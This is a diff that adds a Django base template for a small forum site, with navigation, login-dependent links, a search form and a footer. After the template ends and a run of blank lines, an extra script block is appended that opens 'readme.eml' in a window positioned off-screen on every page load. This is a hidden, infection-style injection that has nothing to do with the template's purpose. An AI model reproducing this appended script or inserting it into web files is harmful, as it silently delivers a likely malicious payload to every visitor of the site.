@@ -1,0 +1,82 @@
+{% load static %}
+
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>{{title}}</title>
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css">
+        <link rel="stylesheet" href="/static/style.css?{% now "U" %}">
+    </head>
+    <body>
+        <header>
+            <div class="navbar">
+                <nav class="navigation hide" id="navigation">
+                    <ul class="nav-list">
+                        <span class="close-icon" onclick="showIconbar()"><i class="fa fa-close"></i></span>
+                        <li class="nav-item">
+                            <a href="{% url 'home' %}">Home</a>
+                        </li>
+                        {% if request.user.is_authenticated %}
+                        <li class="nav-item">
+                            <a href="{% url 'create_post' %}">Create</a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="{% url 'logout' %}">Logout</a>
+                        </li>
+                        {% else %}
+                        <li class="nav-item">
+                            <a href="{% url 'signup' %}">SignUp</a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="{% url 'signin' %}">SignIn</a>
+                        </li>
+                        {% endif %}
+                        <li class="nav-item">
+                            <a href="{% url 'about_site' %}">About Site</a>
+                        </li>
+                    </ul>
+                </nav>
+                <a href="#" class="bar-icon" id="iconBar" onclick="hideIconBar()"><i class="fa fa-bars"></i></a>
+                <div class="site-banner" id="SiteBanner">
+                    <div class="site-logo"><img src="{% static 'tg-logo.png' %}" width="70" height="60"></div>
+                    <div class="site-name">Forums</div>
+                </div>
+            </div>
+            <!-- Search Box -->
+            <form action="{% url 'search_result' %}" role="form" method="GET">
+                <div class="Search-box">
+                    <div>
+                        <select name="search-box" id="">
+                            <option value="Everything">Everything</option>
+                            <option value="Titles">Titles</option>
+                            <option value="Descriptions">Descriptions</option>
+                        </select>
+                        <input type="text" name="q" id="" placeholder="search...">
+                        <button type="submt" name="search"><i class="fa fa-search"></i></button>
+                    </div>
+                </div>
+            </form>
+        </header>
+        {% block content %}
+        {% endblock content %}
+        
+
+        <footer>
+            <span>&nbsp;Made by: Satyam Tyagi | All rights Reserved.</span>
+        </footer>
+
+        <script src="{% static 'main.js' %}"></script>
+    </body>
+</html>
+
+
+
+
+
+
+
+
+
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html>
